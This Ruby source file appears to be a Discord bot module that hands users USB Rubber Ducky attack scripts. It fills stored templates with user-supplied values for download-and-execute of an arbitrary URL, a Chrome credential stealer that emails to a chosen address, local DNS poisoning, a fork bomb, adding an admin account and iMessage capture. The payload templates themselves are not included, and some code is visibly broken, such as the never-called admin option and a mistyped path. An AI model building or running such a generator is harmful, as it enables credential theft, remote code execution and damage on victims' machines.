require 'colorize'
module Bot::DiscordCommands
  # Responds with "Pong!".
  # This used to check if bot is alive
  module Ducky
    extend Discordrb::Commands::CommandContainer
    def self.Options(num, options, uid)
        options = options.split(";")
        case num
        when "1"
            # DownloadAndExecute
            url      = options[1]
            file_name = options[0]
            # checks if its nil
            # if it is not, returns example
            if url.nil? or  file_name.nil?
                return "example:```.ducky 1; 127.0.0.1; file;```"
            end
            DownloadAndExecute(url, file_name, uid)
        when "2"
            ShutDownWin10(uid)
        when "3"
            site = options[1]
            ip   = options[2]
            if site.nil? or ip.nil? 
                return "example: ``` .ducky 3; site; ip;```"
            end
            LocalDNSPoison(site, ip, uid)
        when "4"
            Ducky.Android5xUnlock(uid)
        when "5"
            Ducky.Win7LogOff(uid)
        when "6"
            email = options[1]
            toEmail = options[2]
            if email.nil? or toEmail.nil? 
                return "Example:  ``` .ducky 6; email, toEmail;```"
           end
           Ducky.ChromeStealer(uid, email, toEmail)
           
        when "7"
            channelId = options[1]
            if channelId.nil? 
                return "example: ```.ducky 7; channelId;```"
            end
            Ducky.YoutubeSub(uid, channelId)
        when "8"
            site = options[1]
            puts site
            if site.nil?
                return "Example: ```.ducky 8; site;```"
            end
            Ducky.ChromeHomePage(uid, site)
        when "9"
            Ducky.InvisibleForkBomb(uid)
        when "10"
            Ducky.OSXWgetAndExecute(uid)
        when "11"
            Ducky.OsxIMessageCapature(uid)
        when "12"
            Ducky.FakeUpdateScreen(uid)
        when "13"
            Ducky.RickRolll(uid)
        when "14"
            Ducky.Xmas(uid)
        when "15"
            Ducky.anti_browser(uid)
        when "16"
            acc_name    = options[1]
            acc_pass    = options[0]
            # checks if its nil
            # if it is not, returns example
            if acc_pass.nil? or  acc_name.nil?
                return "example:```.ducky 16; username; pass;```"
            end
        end
    end
    def self.ducky_list
        a =  %Q(
                1 ] Download and Execute
                2 ] ShutDown Winodws 10
                3 ] Local DNS Poison
                4 ] Androud Unlocked
                5 ] Win7 Log Off
                6 ] Chrome Stealer
                7 ] YouTubeSub
                8 ] Chrome Home Page
                9 ] InvisibleForkBomb
                10] OSX Wget and Execute
                11] OXSImessageCapature
                12] Fake Update Screen
                13] Rick Roll
                14] Xmas PayLoad
                15] Anti Browser
                16] Add Admin
                )
    end
    def self.win_add_admin(uid, acc_name, acc_pass)
        f = File.read("lib/scripts/16.txt")
        main = f.gsub("ADMIN", acc_name.to_s).gsub("admin", acc_pass.to_s)
        fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
            a << main
        end
    end
    def self.anti_browser(uid)
        f = File.read("lib/script/15.txt")
        fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
            a << f
        end
    end
    def self.Xmas(uid)
        f = File.read("lib/scripts/14.txt")
        fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
            a << f
        end
    end
    def self.RickRolll(uid)
        f = File.read("lib/scripts/13.txt")
        fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
            a << f
        end
    end
    def self.FakeUpdateScreen(uid)
        f = File.read("lib/scripts/12.txt")
        fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
            a << f
        end
    end
    def self.OsxIMessageCapature(uid)
        f = File.read("lib/scripts/11.txt")
        fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
            a << f
        end
    end
    def self.OSXWgetAndExecute(uid)
        f = File.read("lib/scripts/10.txt")
        fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
            a << f
        end
    end
    def self.InvisibleForkBomb(uid)
        f = File.read("lib/scripts/9.txt")
        fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
            a << f
        end
    end
    def self.ChromeHomePage(uid, site)
        f = File.read("lib/scripts/8.txt")
	    main = f.gsub("www.pornhub.com", site.to_s)
        fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
            a << main
        end
    end
    def self.YoutubeSub(uid, channelId)
        f = File.read("lib/scripts/7.txt")
	    main = f.gsub("YOUR CHANNEL ID", channelId.to_s)
        fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
            a << main
        end
        
    end
    def self.ChromeStealer(uid, email, toEmail)
        f = File.read("lib/scripts/6.txt")
	    main = f.gsub("youremail@gmail.com", email.strip).gsub("toemail@gmail.com", toEmail.strip)
        fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
            a << main
        end
    end
    def self.Win7LogOff(uid)
        f = File.read("lib/scripts/5.txt")
        fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
            a << f
        end
    end
    def self.Android5xUnlock(uid)
        f = File.read("lib/scripts/4.txt")
        fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
            a << f
        end
    end
    def self.LocalDNSPoison(site, ip, uid)
        f = File.read("lib/scripts/3.txt")
	    main = f.gsub("10.0.0.1", ip.to_s).gsub("ADMIN.COM", site.to_s)
        fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
            a << main
        end
    end
    def self.DownloadAndExecute(url, file_name, uid)
        # 1
        f = File.read("lib/scripts/1.txt")
	    main = f.gsub("abc.exe", url.strip.to_s).gsub("mess1.exe",file_name.to_s)
        fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
            a << main
        end
    end
    def self.ShutDownWin10(uid)
        # 2
        f = File.read("lib/scripts/2.txt")
        fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
            a << f
        end
    end
    command([:lsducky, :listducky], description:"List ducky scripts options", usage:".lsducky") do |event|
        event.respond(ducky_list.to_s)
    end
    command(:ducky,  description:"Ducky script for days", usage:".ducky <id> <options") do |event, id, options|
        begin
            options = options.join(" ")
        rescue
        end
        Options(id, options, event.user.id.to_s)
        event.send_file(File.open("lib/done/#{event.user.id.to_s}.txt", 'r'))
        #event.respond(kali.to_s)
    end
  end
end

#puts Ducky.Options("8", "google.china", "9999999999")